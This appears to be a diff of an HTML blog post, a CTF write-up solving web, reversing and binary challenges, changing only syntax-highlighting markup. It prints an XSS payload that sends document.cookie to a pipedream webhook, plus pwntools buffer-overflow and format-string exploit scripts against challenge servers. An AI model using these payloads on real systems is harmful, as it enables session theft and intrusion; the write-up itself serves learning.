@@ -7,7 +7,7 @@
 <meta name="author" content="">
 <meta name="description" content="This was a really fun CTF with plenty of variety in terms of challenges. Lots of fun doable ones with plenty of learning opportunities as well as some more challenging ones. I managed to pull off a second place finish with the help of the smaller number of players (40 odd) and the generosity of the pwn challenge points.
 Idiot warning ⚠️
- Please note that everything I write here and in these blogs is what I think I know to be true." />
+Please note that everything I write here and in these blogs is what I think I know to be true." />
 <meta name="keywords" content=", hacking, CTF, Binary Exploitation, Web Hacking, Steganography" />
 <meta name="robots" content="noodp" />
 <meta name="theme-color" content="#252627" />
@@ -38,7 +38,7 @@ Idiot warning ⚠️
 <meta itemprop="name" content="Atlassian{CTF Writeup}">
 <meta itemprop="description" content="This was a really fun CTF with plenty of variety in terms of challenges. Lots of fun doable ones with plenty of learning opportunities as well as some more challenging ones. I managed to pull off a second place finish with the help of the smaller number of players (40 odd) and the generosity of the pwn challenge points.
 Idiot warning ⚠️
- Please note that everything I write here and in these blogs is what I think I know to be true."><meta itemprop="datePublished" content="2021-10-22T00:00:00+00:00" />
+Please note that everything I write here and in these blogs is what I think I know to be true."><meta itemprop="datePublished" content="2021-10-22T00:00:00+00:00" />
 <meta itemprop="dateModified" content="2021-10-22T00:00:00+00:00" />
 <meta itemprop="wordCount" content="2220">
 <meta itemprop="keywords" content="hacking,CTF,Binary Exploitation,Web Hacking,Steganography," />
@@ -46,7 +46,7 @@ Idiot warning ⚠️
 <meta name="twitter:title" content="Atlassian{CTF Writeup}"/>
 <meta name="twitter:description" content="This was a really fun CTF with plenty of variety in terms of challenges. Lots of fun doable ones with plenty of learning opportunities as well as some more challenging ones. I managed to pull off a second place finish with the help of the smaller number of players (40 odd) and the generosity of the pwn challenge points.
 Idiot warning ⚠️
- Please note that everything I write here and in these blogs is what I think I know to be true."/>
+Please note that everything I write here and in these blogs is what I think I know to be true."/>
 
 
 
@@ -308,50 +308,50 @@ Idiot warning ⚠️
 <p>Initially I assumed the challenge would require OCR to extract the text from the image programmatically. However, when examining the source for the web page to find the img element in the DOM I noticed that the <code>class</code> name for the <code>img</code> element included the characters in the captcha.</p>
 <p>This means we can just scrape the web page with a utility like beautiful soup and parse the HTML to extract the class name from the image element and send it back to the server.</p>
 <p>The other thing we need to keep in mind is that the server needs a way to know which client (player) is entering captchas in order to track the progress and award the flag. This is done with a session token/cookie which is sent in responses from the server and needs to be included in requests we send back in order to track our captcha entering progress. The python <code>requests</code> lib supports this out of the box with a method <code>Session()</code> which automatically extracts cookies from server responses and sends them back in the request headers. Thus we construct a script like the one bellow to get the flag.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> bs4 <span style="color:#f92672">import</span> BeautifulSoup
-<span style="color:#f92672">import</span> requests
-
-<span style="color:#e6db74">&#39;&#39;&#39;
-</span><span style="color:#e6db74">Use bs4 and requests to solve some x
-</span><span style="color:#e6db74">captcha&#39;s by extracting the capture
-</span><span style="color:#e6db74">data leaked in the img class name.
-</span><span style="color:#e6db74">&#39;&#39;&#39;</span>
-
-
-TARGET_URL <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;http://ctfo.2pmc.net:10022/&#39;</span>
-sesh <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>Session()
-
-
-<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">main</span>(count<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>):
-
-	print(<span style="color:#e6db74">&#34;[&gt;&gt;] Scraping target DOM&#34;</span>)
-	target_html <span style="color:#f92672">=</span> sesh<span style="color:#f92672">.</span>get(TARGET_URL)<span style="color:#f92672">.</span>text
-
-	soup <span style="color:#f92672">=</span> BeautifulSoup(target_html, <span style="color:#e6db74">&#34;html.parser&#34;</span>)
-	dom_target <span style="color:#f92672">=</span> soup<span style="color:#f92672">.</span>find(<span style="color:#e6db74">&#34;img&#34;</span>)<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#39;class&#39;</span>)
-	print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;[&gt;&gt;] extracted target </span><span style="color:#e6db74">{</span>dom_target<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
-	secret <span style="color:#f92672">=</span> dom_target[<span style="color:#ae81ff">0</span>]
-	print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;[&gt;&gt;] sending </span><span style="color:#e6db74">{</span>secret<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
-	<span style="color:#75715e"># send back captcha</span>
-	res <span style="color:#f92672">=</span> sesh<span style="color:#f92672">.</span>post(
-			TARGET_URL,
-			data <span style="color:#f92672">=</span> {
-				<span style="color:#e6db74">&#34;secret&#34;</span>: secret,
-				<span style="color:#e6db74">&#34;submit&#34;</span>: <span style="color:#e6db74">&#34;verify&#34;</span>
-			}
-	)
-
-	print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;[&gt;&gt;] res </span><span style="color:#e6db74">{</span>res<span style="color:#f92672">.</span>text<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
-	<span style="color:#66d9ef">if</span> (count <span style="color:#f92672">==</span> <span style="color:#ae81ff">70</span>):
-		<span style="color:#66d9ef">return</span>
-
-	count <span style="color:#f92672">+=</span> <span style="color:#ae81ff">1</span>
-	main(count)
-
-
-<span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;__main__&#39;</span>:
-	main()
-</code></pre></div><blockquote>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> bs4 <span style="color:#f92672">import</span> BeautifulSoup
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> requests
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;&#39;&#39;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Use bs4 and requests to solve some x
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">captcha&#39;s by extracting the capture
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">data leaked in the img class name.
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;&#39;&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>TARGET_URL <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;http://ctfo.2pmc.net:10022/&#39;</span>
+</span></span><span style="display:flex;"><span>sesh <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>Session()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">main</span>(count<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>):
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	print(<span style="color:#e6db74">&#34;[&gt;&gt;] Scraping target DOM&#34;</span>)
+</span></span><span style="display:flex;"><span>	target_html <span style="color:#f92672">=</span> sesh<span style="color:#f92672">.</span>get(TARGET_URL)<span style="color:#f92672">.</span>text
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	soup <span style="color:#f92672">=</span> BeautifulSoup(target_html, <span style="color:#e6db74">&#34;html.parser&#34;</span>)
+</span></span><span style="display:flex;"><span>	dom_target <span style="color:#f92672">=</span> soup<span style="color:#f92672">.</span>find(<span style="color:#e6db74">&#34;img&#34;</span>)<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#39;class&#39;</span>)
+</span></span><span style="display:flex;"><span>	print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;[&gt;&gt;] extracted target </span><span style="color:#e6db74">{</span>dom_target<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>	secret <span style="color:#f92672">=</span> dom_target[<span style="color:#ae81ff">0</span>]
+</span></span><span style="display:flex;"><span>	print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;[&gt;&gt;] sending </span><span style="color:#e6db74">{</span>secret<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e"># send back captcha</span>
+</span></span><span style="display:flex;"><span>	res <span style="color:#f92672">=</span> sesh<span style="color:#f92672">.</span>post(
+</span></span><span style="display:flex;"><span>			TARGET_URL,
+</span></span><span style="display:flex;"><span>			data <span style="color:#f92672">=</span> {
+</span></span><span style="display:flex;"><span>				<span style="color:#e6db74">&#34;secret&#34;</span>: secret,
+</span></span><span style="display:flex;"><span>				<span style="color:#e6db74">&#34;submit&#34;</span>: <span style="color:#e6db74">&#34;verify&#34;</span>
+</span></span><span style="display:flex;"><span>			}
+</span></span><span style="display:flex;"><span>	)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;[&gt;&gt;] res </span><span style="color:#e6db74">{</span>res<span style="color:#f92672">.</span>text<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (count <span style="color:#f92672">==</span> <span style="color:#ae81ff">70</span>):
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	count <span style="color:#f92672">+=</span> <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>	main(count)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;__main__&#39;</span>:
+</span></span><span style="display:flex;"><span>	main()
+</span></span></code></pre></div><blockquote>
 <p><code>flag{N0_n33d_f0r_0CR}</code></p>
 </blockquote>
 <h3 id="0x44-door">0x44 Door</h3>
@@ -382,8 +382,8 @@ password
 <p>In this case the page we control has a simple XSS filter on the word <code>script</code> so we can simply switch the case to caps since all HTML elements are case insensitive in order to evade the filter.</p>
 <p>Since we cannot &lsquo;see&rsquo; the clients web page we are attacking we need a way to capture their cookie and send it some place we can see. This is called an out of band approach. A great way to do this for XSS is with a webhook website like <a href="https://pipedream.net">pipedream</a> or requestbin which gives you an ephemeral public url that you can place in your payload, which when triggered makes a request to the url with the targets cookie as a parameter.</p>
 <p>A sample payload bellow:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style="color:#f92672">&lt;</span><span style="color:#a6e22e">SCRIPT</span><span style="color:#f92672">&gt;</span><span style="color:#a6e22e">fetch</span>(<span style="color:#e6db74">`https://&lt;ur-subdomain&gt;.m.pipedream.net?cookie=</span><span style="color:#e6db74">${</span>encodeURIComponent(document.<span style="color:#a6e22e">cookie</span>)<span style="color:#e6db74">}</span><span style="color:#e6db74">`</span>)<span style="color:#f92672">&lt;</span><span style="color:#960050;background-color:#1e0010">/ScRiPt&gt;</span>
-</code></pre></div><blockquote>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#f92672">&lt;</span><span style="color:#a6e22e">SCRIPT</span><span style="color:#f92672">&gt;</span><span style="color:#a6e22e">fetch</span>(<span style="color:#e6db74">`https://&lt;ur-subdomain&gt;.m.pipedream.net?cookie=</span><span style="color:#e6db74">${</span>encodeURIComponent(document.<span style="color:#a6e22e">cookie</span>)<span style="color:#e6db74">}</span><span style="color:#e6db74">`</span>)<span style="color:#f92672">&lt;</span><span style="color:#960050;background-color:#1e0010">/ScRiPt&gt;</span>
+</span></span></code></pre></div><blockquote>
 <p><code>flag{S00_XSS_1snt_that_h@rd}</code></p>
 </blockquote>
 <h3 id="0x50-door">0x50 door</h3>
@@ -423,7 +423,6 @@ password
 0380   64 74 72 6f 6a 61 6e 5f 66 6c 61 67 7b 73 74 72   dtrojan_flag{str
 0390   69 6e 67 73 5f 61 72 65 5f 6d 79 5f 66 72 69 65   ings_are_my_frie
 03a0   6e 64 7d                                          nd}
-
 </code></pre><blockquote>
 <p><code>trojan_flag{strings_are_my_friend}</code></p>
 </blockquote>
@@ -432,105 +431,104 @@ password
 <ol>
 <li>Use <a href="https://docs.pwntools.com/en/stable/">pwntools</a> to send the raw <code>0x7</code> byte</li>
 </ol>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">## get da banner</span>
-log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#39;Receiving banner ...&#39;</span>)
-proc<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#39;printFlag &#39;</span>)
-print_flag_addr <span style="color:#f92672">=</span> proc<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>)
-
-passwd <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;supe</span><span style="color:#ae81ff">\x07</span><span style="color:#e6db74">r_s3cret&#39;</span>
-proc<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;Enter the password: &#39;</span>, passwd)
-
-
-<span style="color:#75715e"># shellit</span>
-proc<span style="color:#f92672">.</span>interactive()
-</code></pre></div><h3 id="jump">jump</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">## get da banner</span>
+</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#39;Receiving banner ...&#39;</span>)
+</span></span><span style="display:flex;"><span>proc<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#39;printFlag &#39;</span>)
+</span></span><span style="display:flex;"><span>print_flag_addr <span style="color:#f92672">=</span> proc<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>passwd <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;supe</span><span style="color:#ae81ff">\x07</span><span style="color:#e6db74">r_s3cret&#39;</span>
+</span></span><span style="display:flex;"><span>proc<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;Enter the password: &#39;</span>, passwd)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># shellit</span>
+</span></span><span style="display:flex;"><span>proc<span style="color:#f92672">.</span>interactive()
+</span></span></code></pre></div><h3 id="jump">jump</h3>
 <p>This challenge was a standard ret2win type buffer overflow challenge. We start by observing that the binary leaks the memory address of <code>printFlag</code> and also that the function is not called anywhere in the program. In such cases the goal is to call that function ourself, typically by exploiting a buffer overflow.</p>
 <p>There are a few ways to determine if the binary is vulnerable to a buffer overflow but my personal favourite is to run the binary with <code>gdb</code> and then use <code>cyclic</code> to generate a big patterned input we can then use to calculate the offset to the return pointer. In this case we produced a crash with <code>cyclic 100</code> and the offset was around <code>cyclic_find(b'agaa') - 5</code>. We can then chain this with the leaked address of <code>printFlag</code> to swap out the return pointer with its address causing the binary to jump there when it returns.</p>
 <p>This worked fine locally but failed against the remote server so I fuzzed the offset until the payload popped on <code>cyclic_find(b'agaa') - 1</code>.</p>
 <p><em>If you want to read more about basic overflows I also wrote this guide, <a href="https://cybernetic.coffee/blog/basic-stack-based-overflows/">Basic Stack Based Overflows</a></em></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">HOST <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;ctfo.2pmc.net:10003&#39;</span>
-<span style="color:#e6db74">&#34;&#34;&#34; hack the program &#34;&#34;&#34;</span>
-binary <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;./</span><span style="color:#e6db74">{</span>PATH<span style="color:#e6db74">}</span><span style="color:#e6db74">/</span><span style="color:#e6db74">{</span>BINARY<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>
-proc <span style="color:#f92672">=</span> process(binary)
-rop <span style="color:#f92672">=</span> ROP(binary)
-elf <span style="color:#f92672">=</span> ELF(binary, <span style="color:#66d9ef">False</span>)
-
-
-<span style="color:#75715e">## get da banner</span>
-log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#39;Receiving banner ...&#39;</span>)
-proc<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#39;printFlag &#39;</span>)
-print_flag_addr <span style="color:#f92672">=</span> int(proc<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#39;.&#39;</span>, drop<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>), <span style="color:#ae81ff">16</span>)
-
-log<span style="color:#f92672">.</span>success(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;printFlag leak: </span><span style="color:#e6db74">{</span>hex(print_flag_addr)<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>)
-
-<span style="color:#75715e"># Worked locally</span>
-<span style="color:#75715e"># offset = cyclic_find(b&#39;agaa&#39;) - 5</span>
-
-<span style="color:#75715e"># offset for remote</span>
-offset <span style="color:#f92672">=</span> cyclic_find(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;agaa&#39;</span>) <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>
-log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;Offset: </span><span style="color:#e6db74">{</span>offset<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>)
-
-payload <span style="color:#f92672">=</span> flat({
-    offset: p64(print_flag_addr)
-})
-
-proc<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;name: &#39;</span>, payload)
-
-
-<span style="color:#75715e"># shellit</span>
-proc<span style="color:#f92672">.</span>interactive()
-
-</code></pre></div><blockquote>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>HOST <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;ctfo.2pmc.net:10003&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;&#34;&#34; hack the program &#34;&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>binary <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;./</span><span style="color:#e6db74">{</span>PATH<span style="color:#e6db74">}</span><span style="color:#e6db74">/</span><span style="color:#e6db74">{</span>BINARY<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>
+</span></span><span style="display:flex;"><span>proc <span style="color:#f92672">=</span> process(binary)
+</span></span><span style="display:flex;"><span>rop <span style="color:#f92672">=</span> ROP(binary)
+</span></span><span style="display:flex;"><span>elf <span style="color:#f92672">=</span> ELF(binary, <span style="color:#66d9ef">False</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">## get da banner</span>
+</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#39;Receiving banner ...&#39;</span>)
+</span></span><span style="display:flex;"><span>proc<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#39;printFlag &#39;</span>)
+</span></span><span style="display:flex;"><span>print_flag_addr <span style="color:#f92672">=</span> int(proc<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#39;.&#39;</span>, drop<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>), <span style="color:#ae81ff">16</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>success(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;printFlag leak: </span><span style="color:#e6db74">{</span>hex(print_flag_addr)<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Worked locally</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># offset = cyclic_find(b&#39;agaa&#39;) - 5</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># offset for remote</span>
+</span></span><span style="display:flex;"><span>offset <span style="color:#f92672">=</span> cyclic_find(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;agaa&#39;</span>) <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;Offset: </span><span style="color:#e6db74">{</span>offset<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> flat({
+</span></span><span style="display:flex;"><span>    offset: p64(print_flag_addr)
+</span></span><span style="display:flex;"><span>})
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>proc<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;name: &#39;</span>, payload)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># shellit</span>
+</span></span><span style="display:flex;"><span>proc<span style="color:#f92672">.</span>interactive()
+</span></span></code></pre></div><blockquote>
 <p><code>flag{sup3rrrrrr_s1mple_pwn}</code></p>
 </blockquote>
 <h3 id="printf">printf</h3>
 <p>This was a pleasantly straightforward format string based binary which included the source code of the program. The only real prerequisite was knowing that you can use <code>%n</code> (and its variants) in the presence of a format string vuln to write to memory. Taking a look at the source code our main function of interest is:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">
-<span style="color:#66d9ef">void</span> <span style="color:#a6e22e">authenticate</span>()
-{
-    <span style="color:#75715e">// find this buf
-</span><span style="color:#75715e"></span>    <span style="color:#66d9ef">char</span> buf[<span style="color:#ae81ff">200</span>];
-    <span style="color:#66d9ef">char</span> isAllowed <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
-
-    printf(<span style="color:#e6db74">&#34;%p</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#f92672">&amp;</span>isAllowed);
-
-    fflush(stdout);
-
-    fgets(buf, <span style="color:#ae81ff">200</span>, stdin);
-
-    printf(buf);
-    fflush(stdout);
-
-    <span style="color:#75715e">// todo -&gt; flip this
-</span><span style="color:#75715e"></span>    <span style="color:#66d9ef">if</span> (isAllowed)
-    {
-        printFlag();
-    }
-}
-</code></pre></div><p>Which makes it clear our goal is to modify <code>isAllowed</code> to a non-zero value such that the check will pass and leak the flag. As mentioned our format string vulnerability, which is introduced just before the if case <code>printf(buf)</code>, can be exploited with <code>%n</code> to alter the memory at <code>isAllowed</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">authenticate</span>()
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// find this buf
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">char</span> buf[<span style="color:#ae81ff">200</span>];
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> isAllowed <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;%p</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#f92672">&amp;</span>isAllowed);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">fflush</span>(stdout);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">fgets</span>(buf, <span style="color:#ae81ff">200</span>, stdin);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(buf);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">fflush</span>(stdout);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// todo -&gt; flip this
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">if</span> (isAllowed)
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">printFlag</span>();
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>Which makes it clear our goal is to modify <code>isAllowed</code> to a non-zero value such that the check will pass and leak the flag. As mentioned our format string vulnerability, which is introduced just before the if case <code>printf(buf)</code>, can be exploited with <code>%n</code> to alter the memory at <code>isAllowed</code>.</p>
 <p>Of note is that the binary also leaks the memory address of <code>isAllowed</code> which we can see in the source code just bellow the variable decelerations.</p>
 <p>For format string challenges I use a little utility lib that I made myself, you can find it <a href="https://github.com/Angus-C-git/SecSheets/blob/master/Binary%20Exploitation/FormatStrings/FormatStrings.md#automated-format-sting-payloads">here</a>. Alternatively pwntools has one built in.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">
-<span style="color:#75715e"># fmt</span>
-<span style="color:#f92672">from</span> formatstrings.fmt_string <span style="color:#f92672">import</span> build
-
-
-<span style="color:#75715e"># ::::::::::::::::::::::::: CONFIG :::::::::::::::::::::::::</span>
-PATH <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;Chals&#39;</span>
-BINARY <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;printf&#39;</span>
-HOST <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;ctfo.2pmc.net:10004&#39;</span>
-
-<span style="color:#75715e">## get da banner</span>
-log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#39;Receiving banner ...&#39;</span>)
-isAllowed_addr <span style="color:#f92672">=</span> int(proc<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>, drop<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>), <span style="color:#ae81ff">16</span>)
-log<span style="color:#f92672">.</span>success(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;isAllowed_addr: </span><span style="color:#e6db74">{</span>hex(isAllowed_addr)<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>)
-
-payload <span style="color:#f92672">=</span> build(isAllowed_addr, <span style="color:#ae81ff">0x42</span>, <span style="color:#ae81ff">6</span>)
-proc<span style="color:#f92672">.</span>sendline(payload)
-
-<span style="color:#75715e"># shellit</span>
-proc<span style="color:#f92672">.</span>interactive()
-</code></pre></div><blockquote>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># fmt</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> formatstrings.fmt_string <span style="color:#f92672">import</span> build
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># ::::::::::::::::::::::::: CONFIG :::::::::::::::::::::::::</span>
+</span></span><span style="display:flex;"><span>PATH <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;Chals&#39;</span>
+</span></span><span style="display:flex;"><span>BINARY <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;printf&#39;</span>
+</span></span><span style="display:flex;"><span>HOST <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;ctfo.2pmc.net:10004&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">## get da banner</span>
+</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#39;Receiving banner ...&#39;</span>)
